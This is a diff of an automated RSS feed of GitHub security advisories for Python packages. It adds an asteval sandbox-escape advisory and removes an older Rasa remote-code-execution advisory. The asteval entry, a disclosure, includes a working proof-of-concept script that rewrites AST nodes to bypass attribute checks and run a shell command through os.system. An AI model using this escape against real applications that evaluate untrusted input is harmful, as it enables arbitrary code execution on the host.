@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-01-23T22:01:22.384Z</updated>
+    <updated>2025-01-23T23:01:18.427Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,142 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[asteval] ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape]]></title>
+        <id>https://github.com/advisories/GHSA-vp47-9734-prjw</id>
+        <link href="https://github.com/advisories/GHSA-vp47-9734-prjw"/>
+        <updated>2025-01-23T22:33:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>If an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability is rooted in how <code>asteval</code> performs attribute access verification. In particular, the <a href="https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565"><code>on_attribute</code></a> node handler prevents access to attributes that are either present in the <code>UNSAFE_ATTRS</code> list or are formed by names starting and ending with <code>__</code>, as shown in the code snippet below:</p>
+<pre><code class="language-py">    def on_attribute(self, node):    # ('value', 'attr', 'ctx')
+        """Extract attribute."""
+
+        ctx = node.ctx.__class__
+        if ctx == ast.Store:
+            msg = "attribute for storage: shouldn't be here!"
+            self.raise_exception(node, exc=RuntimeError, msg=msg)
+
+        sym = self.run(node.value)
+        if ctx == ast.Del:
+            return delattr(sym, node.attr)
+        #
+        unsafe = (node.attr in UNSAFE_ATTRS or
+                 (node.attr.startswith('__') and node.attr.endswith('__')))
+        if not unsafe:
+            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():
+                unsafe = isinstance(sym, dtype) and node.attr in attrlist
+                if unsafe:
+                    break
+        if unsafe:
+            msg = f"no safe attribute '{node.attr}' for {repr(sym)}"
+            self.raise_exception(node, exc=AttributeError, msg=msg)
+        else:
+            try:
+                return getattr(sym, node.attr)
+            except AttributeError:
+                pass
+</code></pre>
+<p>While this check is intended to block access to sensitive Python dunder methods (such as <code>__getattribute__</code>), the flaw arises because instances of the <code>Procedure</code> class expose their AST (stored in the <code>body</code> attribute) without proper protection:</p>
+<pre><code class="language-py">class Procedure:
+    """Procedure: user-defined function for asteval.
+
+    This stores the parsed ast nodes as from the 'functiondef' ast node
+    for later evaluation.
+
+    """
+
+    def __init__(self, name, interp, doc=None, lineno=0,
+                 body=None, args=None, kwargs=None,
+                 vararg=None, varkws=None):
+        """TODO: docstring in public method."""
+        self.__ininit__ = True
+        self.name = name
+        self.__name__ = self.name
+        self.__asteval__ = interp
+        self.raise_exc = self.__asteval__.raise_exception
+        self.__doc__ = doc
+        self.body = body
+        self.argnames = args
+        self.kwargs = kwargs
+        self.vararg = vararg
+        self.varkws = varkws
+        self.lineno = lineno
+        self.__ininit__ = False
+</code></pre>
+<p>Since the <code>body</code> attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a <code>Procedure</code> during runtime to leverage unintended behaviour.</p>
+<p>The exploit works as follows:</p>
+<ol>
+<li><p><strong>The Time of Check, Time of Use (TOCTOU) Gadget:</strong></p>
+<p>In the <a href="https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577">code</a> below, a variable named <code>unsafe</code> is set based on whether <code>node.attr</code> is considered unsafe:</p>
+<pre><code class="language-python">unsafe = (node.attr in UNSAFE_ATTRS or
+          (node.attr.startswith('__') and node.attr.endswith('__')))
+</code></pre>
+</li>
+<li><p><strong>Exploiting the TOCTOU Gadget:</strong></p>
+<p>An attacker can abuse this gadget by hooking any <code>Attribute</code> AST node that is not in the <code>UNSAFE_ATTRS</code> list. The attacker modifies the <code>node.attr.startswith</code> function so that it points to a custom procedure. This custom procedure performs the following steps:</p>
+<ul>
+<li>It replaces the value of <code>node.attr</code> with the string <code>"__getattribute__"</code> and returns <code>False</code>.</li>
+<li>Thus, when <code>node.attr.startswith('__')</code> is evaluated, it returns <code>False</code>, which causes the condition to short-circuit and sets <code>unsafe</code> to <code>False</code>.</li>
+<li>However, by that time, <code>node.attr</code> has been changed to <code>"__getattribute__"</code>, which will be used in the subsequent <code>getattr(sym, node.attr)</code> call. An attacker can then use the obtained reference to <code>sym.__getattr__</code>to retrieve malicious attributes without needing to pass the <code>on_attribute</code> checks.</li>
+</ul>
+</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<p>The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the <code>whoami</code> command on the host machine:</p>
+<pre><code class="language-py">from asteval import Interpreter
+aeval = Interpreter()
+code = """
+ga_str = "__getattribute__"
+def lender():
+    a
+    b
+def pwn():
+    ga = lender.dontcare
+    init = ga("__init__")
+    ga = init.dontcare
+    globals = ga("__globals__")
+    builtins = globals["__builtins__"]
+    importer = builtins["__import__"]
+    importer("os").system("whoami")
+
+def startswith1(str):
+    # Replace the attr on the targeted AST node with "__getattribute__"
+    pwn.body[0].value.attr = ga_str
+    return False    
+
+def startswith2(str):
+    pwn.body[2].value.attr = ga_str
+    return False    
+
+n1 = lender.body[0]
+n1.startswith = startswith1
+pwn.body[0].value.attr = n1
+
+n2 = lender.body[1]
+n2.startswith = startswith2
+pwn.body[2].value.attr = n2
+
+pwn()
+"""
+aeval(code)
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw">https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw</a></li>
+<li><a href="https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2">https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li>
+<li><a href="https://github.com/advisories/GHSA-vp47-9734-prjw">https://github.com/advisories/GHSA-vp47-9734-prjw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vp47-9734-prjw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-01-23T22:33:48.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[RestrictedPython] try/except* clauses could allow bypass RestrictedPython via type confusion bug in the CPython interpreter]]></title>
         <id>https://github.com/advisories/GHSA-gmj9-h825-chq2</id>
@@ -863,69 +999,5 @@ normalized_blocked_paths = [str(p).lower() for p in blocked_paths]
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2025-01-14T16:32:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rasa] Rasa Allows Remote Code Execution via Remote Model Loading]]></title>
-        <id>https://github.com/advisories/GHSA-cpv4-ggrr-7j9v</id>
-        <link href="https://github.com/advisories/GHSA-cpv4-ggrr-7j9v"/>
-        <updated>2025-01-14T21:59:25.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="vulnerability">Vulnerability</h2>
-<p>A vulnerability has been identified in Rasa Pro and Rasa Open Source that enables an attacker who has the ability to load a maliciously crafted model remotely into a Rasa instance to achieve Remote Code Execution.</p>
-<p>The prerequisites for this are:</p>
-<ul>
-<li>The HTTP API must be enabled on the Rasa instance eg with <code>--enable-api</code>. This is not the default configuration.</li>
-<li>For unauthenticated RCE to be exploitable, the user must not have configured any authentication or other security controls recommended in our documentation.</li>
-<li>For authenticated RCE, the attacker must posses a valid authentication token or JWT to interact with the Rasa API.</li>
-</ul>
-<h2 id="fix">Fix</h2>
-<p>We encourage you to upgrade to a version of Rasa that includes a fix. These are:</p>
-<ul>
-<li>Rasa Pro 3.8.18, 3.9.16, 3.10.12</li>
-<li>Rasa Open Source 3.6.21</li>
-</ul>
-<p>Once you have upgraded your Rasa Pro or Open Source installation, you will need to retrain your model using the fixed version of Rasa Pro or Open Source. If you have a custom component that inherits from one of the components listed below and modified the persist or load method, make sure to update your code. Please contact us in case you encounter any problems.</p>
-<p>Affected components:</p>
-<ul>
-<li><code>CountVectorFeaturizer</code></li>
-<li><code>LexicalSyntacticFeaturizer</code></li>
-<li><code>LogisticRegressionClassifier</code></li>
-<li><code>SklearnIntentClassifier</code></li>
-<li><code>DIETClassifier</code></li>
-<li><code>CRFEntityExtractor</code></li>
-<li><code>TrackerFeaturizer</code></li>
-<li><code>TEDPolicy</code></li>
-<li><code>UnexpectedIntentTEDPolicy</code></li>
-</ul>
-<p>If you are unable to upgrade immediately, please follow our mitigation advice below.</p>
-<h2 id="mitigation-advice">Mitigation Advice</h2>
-<ul>
-<li><p>The unauthenticated RCE can be mitigated by ensuring that you enable authentication for the Rasa HTTP API if this is enabled. This means that in addition to passing <code>--enable-api</code> to Rasa, you should also pass an authentication configuration as described in our documentation <a href="https://rasa.com/docs/rasa-pro/production/rest-api/#enabling-the-rest-api">here</a>. </p>
-</li>
-<li><p>The authenticated RCE can be mitigated by:</p>
-<ul>
-<li>Ensuring that you only load models from trusted sources such as your own CI pipelines. You can check file hashes for model archives to confirm that a model has not been tampered with between training and use.</li>
-<li>Confirming that you have sufficient access controls and utilize the principle of least privilege to control who in your organization has the ability to interact with the Rasa API even with authentication enabled.</li>
-</ul>
-</li>
-</ul>
-<h2 id="future-releases">Future Releases</h2>
-<p>As an additional security step, a future release of Rasa Pro will remove the ability to enable the API without any authentication method enabled.</p>
-<h2 id="credit">Credit</h2>
-<p>Rasa would like to thank Julian Scheid from Deutsche Telekom Security GmbH for responsible disclosure of this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-cpv4-ggrr-7j9v">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-cpv4-ggrr-7j9v</a></li>
-<li><a href="https://github.com/RasaHQ/rasa/commit/2bb1d779d4f4acaf70b6dfa35dd1899dccbb1ae6">https://github.com/RasaHQ/rasa/commit/2bb1d779d4f4acaf70b6dfa35dd1899dccbb1ae6</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49375">https://nvd.nist.gov/vuln/detail/CVE-2024-49375</a></li>
-<li><a href="https://github.com/advisories/GHSA-cpv4-ggrr-7j9v">https://github.com/advisories/GHSA-cpv4-ggrr-7j9v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cpv4-ggrr-7j9v</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2025-01-14T16:00:21.000Z</published>
     </entry>
 </feed>
